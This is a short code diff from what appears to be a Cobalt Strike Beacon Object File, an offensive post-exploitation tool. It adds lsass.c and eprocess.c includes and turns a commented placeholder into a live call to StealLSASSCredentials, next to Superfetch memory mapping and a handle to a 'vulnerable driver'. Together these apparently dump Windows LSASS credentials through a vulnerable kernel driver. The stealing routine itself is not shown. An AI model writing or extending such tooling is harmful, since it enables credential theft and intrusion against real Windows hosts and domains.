@@ -7,6 +7,8 @@
 #include "utils.c"
 #include "privileges.c"
 #include "superfetch.c"
+#include "lsass.c"
+#include "eprocess.c"
 
 
 int go(char *args, int argLen)
@@ -52,14 +54,14 @@ int go(char *args, int argLen)
     }
 
 
-    char *build = GetWinBuildNumber();
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Windows Build Number: %s", build);
+    char* WindowsBuild = GetWinBuildNumber();
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Windows Build Number: %s", WindowsBuild);
 
 
-    // Build Global Database
     CreateGlobalSuperfetchDatabase();
 
-    // StealLsassCredentials()
+
+    StealLSASSCredentials(hFile, WindowsBuild);
 
 
     BeaconPrintf(CALLBACK_OUTPUT, "[+] Closing handle to vulnerable driver");
